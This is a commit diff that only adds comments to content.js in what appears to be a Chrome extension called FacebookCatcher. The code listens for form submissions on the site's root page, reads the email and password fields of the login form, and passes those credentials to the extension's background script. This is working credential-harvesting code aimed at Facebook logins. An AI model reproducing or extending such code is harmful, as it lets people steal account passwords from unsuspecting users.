20064a1253033e34f00673e939e52ae9f3083f28
Cami Rodriguez <camiepisode@outlook.com>
2015-12-05 20:13:38 -0500

    Added comments

--- FacebookCatcher/js/content.js
+++ FacebookCatcher/js/content.js
@@ -1,13 +1,18 @@
 (function(){
 	console.log('ready from content.js')
-		
+	
 	document.addEventListener("submit", function (e) {
-		
+		// This code is executed when submit event is fired
+
+		// If the path is root
 		if (window.location.pathname === '/') {
+			// Get captured data from login form
 			var data = {
 				"email" : $("#email").val(),
 				"password" : $("#pass").val()
 			}
+
+			// Send a message to background.js
 			chrome.runtime.sendMessage({type : 'on_form_submit', 'data' : data}, function(data){
 				console.log(data.response);
 			});
@@ -15,5 +20,3 @@
 		}	  
 	}, false);
 })();
-
-
